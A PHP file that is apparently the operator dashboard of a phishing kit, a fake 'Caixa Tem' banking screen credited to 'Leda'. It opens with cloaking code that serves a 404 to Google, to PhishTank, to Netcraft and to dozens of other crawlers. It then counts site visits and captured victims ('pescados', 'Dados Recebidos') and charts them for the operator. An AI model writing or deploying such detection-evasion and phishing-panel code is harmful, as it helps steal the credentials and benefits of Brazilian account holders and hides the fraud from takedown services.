<?php
session_start(); 
include 'conn.php';

if (strpos($_SERVER['HTTP_USER_AGENT'], 'google') !== false) {
	header('HTTP/1.0 404 Not Found');
	exit();
  }
  if (strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'google') !== false) {
	header('HTTP/1.0 404 Not Found');
	exit();
  }
  //----------------------------------------------------------------------------------------------------------------//
  function antibotter($user_agent)
  {
	$bots = array(
	  'Googlebot',
	  'Baiduspider',
	  'ia_archiver',
	  'R6_FeedFetcher',
	  'NetcraftSurveyAgent',
	  'Sogou web spider',
	  'bingbot',
	  'Yahoo! Slurp',
	  'facebookexternalhit',
	  'PrintfulBot',
	  'msnbot',
	  'Twitterbot',
	  'UnwindFetchor',
	  'urlresolver',
	  'Butterfly',
	  'TweetmemeBot',
	  'PaperLiBot',
	  'MJ12bot',
	  'AhrefsBot',
	  'Exabot',
	  'Ezooms',
	  'YandexBot',
	  'SearchmetricsBot',
	  'phishtank',
	  'PhishTank',
	  'picsearch',
	  'TweetedTimes Bot',
	  'QuerySeekerSpider',
	  'ShowyouBot',
	  'woriobot',
	  'merlinkbot',
	  'BazQuxBot',
	  'Kraken',
	  'SISTRIX Crawler',
	  'R6_CommentReader',
	  'magpie-crawler',
	  'GrapeshotCrawler',
	  'PercolateCrawler',
	  'MaxPointCrawler',
	  'R6_FeedFetcher',
	  'NetSeer crawler',
	  'grokkit-crawler',
	  'SMXCrawler',
	  'PulseCrawler',
	  'Y!J-BRW',
	  '80legs.com/webcrawler',
	  'Mediapartners-Google',
	  'Spinn3r',
	  'InAGist',
	  'Python-urllib',
	  'NING',
	  'TencentTraveler',
	  'Feedfetcher-Google',
	  'mon.itor.us',
	  'spbot',
	  'Feedly',
	  'bot',
	  'curl',
	  "spider",
	  "crawler"
	);
	foreach ($bots as $bot) {
	  if (stripos($user_agent, $bot) !== false) return true;
	}
	return false;
  }
  
  if (antibotter($_SERVER['HTTP_USER_AGENT'])) {
	echo "404 NOT FOUND";
	exit;
  }

if (!isset($_SESSION['logintrue']) || $_SESSION['logintrue'] !== true) {
    header("Location: login.php");
    exit;
}

$valorAcessos = 0; 


try {
    $sql = "SELECT acessos FROM datas"; 
    $stmt = $conn->prepare($sql);
    $stmt->execute();
    $resultado = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($resultado) {
        $valorAcessos = $resultado['acessos']; 
    }
} catch (PDOException $e) {
    echo "Erro na consulta ao banco de dados: " . $e->getMessage();
}

if (isset($valorAcessos)) {
    echo $valorAcessos;
} else {
    echo "Valor não encontrado.";
}

$valorPescados = 0; 

try {
    $sql = "SELECT pescados FROM datas"; 
    $stmt = $conn->prepare($sql);
    $stmt->execute();
    $resultado = $stmt->fetch(PDO::FETCH_ASSOC);

    if ($resultado) {
        $valorPescados = $resultado['pescados']; 
    }
} catch (PDOException $e) {
    echo "Erro na consulta ao banco de dados: " . $e->getMessage();
}

if (isset($valorPescados)) {
    echo $valorPescados;
} else {
    echo "Valor não encontrado.";
}

$diferenca = $valorAcessos - $valorPescados;
?>

<!DOCTYPE html>
<html lang="en">


<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Tela Fake | By Leda</title>
	<link rel="stylesheet" href="vendor/select2/css/select2.min.css">
	<link href="vendor/owl-carousel/owl.carousel.css" rel="stylesheet">
    <link href="vendor/bootstrap-select/dist/css/bootstrap-select.min.css" rel="stylesheet">
    <link href="css/style.css" rel="stylesheet">
	<link href="../../cdn.lineicons.com/2.0/LineIcons.css" rel="stylesheet">

</head>
<body>

    <!--*******************
        Preloader start
    ********************-->
    <div id="preloader">
        <div class="sk-three-bounce">
            <div class="sk-child sk-bounce1"></div>
            <div class="sk-child sk-bounce2"></div>
            <div class="sk-child sk-bounce3"></div>
        </div>
    </div>
    <!--*******************
        Preloader end
    ********************-->

    <!--**********************************
        Main wrapper start
    ***********************************-->
    <div id="main-wrapper">

        <!--**********************************
            Nav header start
        ***********************************-->
        <div class="nav-header">


            <div class="nav-control">
                <div class="hamburger">
                    <span class="line"></span><span class="line"></span><span class="line"></span>
                </div>
            </div>
        </div>
        <!--**********************************
            Nav header end
        ***********************************-->
	
		<!--**********************************
            Header start
        ***********************************-->
        <div class="header">
            <div class="header-content">
                <nav class="navbar navbar-expand">
                    <div class="collapse navbar-collapse justify-content-between">
                        <div class="header-left">
                            <div class="dashboard_bar">
                                Analise da Tela
                            </div>
                        </div>
                        <ul class="navbar-nav header-right">
							<li class="nav-item">
								<div class="input-group search-area ms-auto d-inline-flex">
									<div class="input-group-append">
									</div>
								</div>
							</li>
							<li class="nav-item dropdown notification_dropdown">
                                <a class="nav-link bell dz-theme-mode active" href="javascript:void(0);">
									<i id="icon-light" class="far fa-sun"></i>
                                    <i id="icon-dark" class="far fa-moon"></i>
                                </a>
							</li>
                                
                            <li class="nav-item dropdown header-profile">
                                <a class="nav-link"  href="javascript:void(0);" role="button" data-bs-toggle="dropdown">
                                    <img src="images/profile/ue.jpg" width="20" alt="">
									<div class="header-info">
										<span>Admin<i class="fa fa-caret-down ms-3" aria-hidden="true"></i></span>
									</div>
                                </a>
                                <div class="dropdown-menu dropdown-menu-end">
                                    <a href="dash.php" class="dropdown-item ai-icon">
                                        <svg id="icon-user1" xmlns="http://www.w3.org/2000/svg" class="text-primary" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path><circle cx="12" cy="7" r="4"></circle></svg>
                                        <span class="ms-2">Infos</span>
                                    </a>
                                    <a href="config.php" class="dropdown-item ai-icon">
                                        <svg id="icon-inbox" xmlns="http://www.w3.org/2000/svg" class="text-success" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
                                        <span class="ms-2">Configs </span>
                                    </a>
                                    <a href="logout.php" class="dropdown-item ai-icon">
                                        <svg id="icon-logout" xmlns="http://www.w3.org/2000/svg" class="text-danger" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4"></path><polyline points="16 17 21 12 16 7"></polyline><line x1="21" y1="12" x2="9" y2="12"></line></svg>
                                        <span class="ms-2">Logout </span>
                                    </a>
                                </div>
                            </li>
                        </ul>
                    </div>
                </nav>
            </div>
        </div>
        <div class="deznav">
            <div class="deznav-scroll">
				<ul class="metismenu" id="menu">
                    <li>
						<a class="has-arrow ai-icon"  href="javascript:void(0);" aria-expanded="false">
							<i class="flaticon-layout"></i>
							<span class="nav-text">Funções</span>
						</a>
                        <ul aria-expanded="false">
							<li><a href="burp.php">Inicio</a></li>
							<li><a href="dash.php">Infos</a></li>
							<li><a href="config.php">Sistema</a></li>

						</ul>
                    </li>
<br>
<br>
<br>
				<div class="copyright">
					<p class="fs-13 font-w200"><strong class="font-w400">Leda TelasFake</strong> © 2024 Direitos ST Alta Cupula</p>
					<p>Made with <i class="fa fa-heart text-danger"></i> by Leda</p>
				</div>
			</div>
        </div>

        <div class="content-body">
			<div class="container-fluid">
				<div class="page-titles">
					<ol class="breadcrumb">

					</ol>
                </div>
				<div class="row">
					<div class="col-xl-6">
						<div class="row">
							<div class="col-xl-12">
								<div class="card">
									<div class="card-header border-0 pb-0">
										<h4 class="fs-20 mb-0">Acessos</h4>

									</div>
									<div class="card-body pb-0">
										<div class="d-flex justify-content-between align-items-center bgl-dark p-3 rounded selling">	
											<span class="text-black fs-14">Acessos</span>
											<span class="text-black fs-14"><?php echo $valorAcessos ?></span>
										</div>
										<div class="row">
											<div class="col-md-6">

												<div class="selling-pie-chart">
													<canvas id="pie_chart"></canvas>
												</div>	
												<script type="text/javascript">
													var valorAcessos = <?php echo json_encode($valorAcessos); ?>;
													var valorPescados = <?php echo json_encode($valorPescados); ?>;
												</script>									
												<div class="chart-point mt-4 text-center">
													<div class="fs-13 col px-0 text-black">
														<span class="a mx-auto"></span>
														Acessos Totais
													</div>
													<div class="fs-13 col px-0 text-black">
														<span class="b mx-auto"></span>
														Dados Recebidos
													</div>
													<div class="fs-13 col px-0 text-black">
														<span class="c mx-auto"></span>
														Bico Não Caiu
													</div>
												</div>
											</div>

										</div>
									</div>
								</div>
							</div>
							<div class="col-sm-6">
							</div>
						</div>
					</div>
							<div class="col-xl-12">	
								<div class="card">
									<div class="card-body row d-sm-flex d-block align-items-center">
										<div class="media col-sm-5 mb-2 mb-sm-0  align-items-center">
											<svg class="me-4 min-w50" width="50" height="53" viewBox="0 0 50 53" fill="none" xmlns="http://www.w3.org/2000/svg">
												<rect width="7.11688" height="52.1905" rx="3" transform="matrix(-1 0 0 1 49.8203 0)" fill="var(--primary)"/>
												<rect width="7.11688" height="37.9567" rx="3" transform="matrix(-1 0 0 1 35.5869 14.2338)" fill="var(--primary)"/>
												<rect width="7.11688" height="16.6061" rx="3" transform="matrix(-1 0 0 1 21.3535 35.5844)" fill="var(--primary)"/>
												<rect width="8.0293" height="32.1172" rx="3" transform="matrix(-1 0 0 1 8.03125 20.0732)" fill="var(--primary)"/>
											</svg>
											<div class="media-body">
												<p class="mb-2 font-w300 text-black">Tela Fake | Caixa Tem</p>
												<span class="fs-26 text-black">29/01/2024</span>
											</div>
										</div>
										<div class="col-sm-7">
											<p class="fs-12 mb-0">Tela Fake Caixa Tem, Encomendada. Personalizada by Leda. Sintonia Alta Cupula.
											</p>
										</div>
									</div>
								</div>
							</div>
							<div class="footer">

						</div>
            </div>
            <div class="copyright">
                <p>Copyright © Designed &amp; Developed by Leda 2024</p>
            </div>
        </div>
        </div>
    </div>

    <script src="vendor/global/global.min.js"></script>
	<script src="vendor/bootstrap-select/dist/js/bootstrap-select.min.js"></script>
	<script src="vendor/chart.js/Chart.bundle.min.js"></script>
	<script src="vendor/owl-carousel/owl.carousel.js"></script>
	<script src="vendor/apexchart/apexchart.js"></script>
	<script src="js/dashboard/page-analytics.js"></script>
	<script src="js/custom.min.js"></script>
	<script src="js/deznav-init.js"></script>
    <script src="js/styleSwitcher.js"></script>


		
</body>

</html>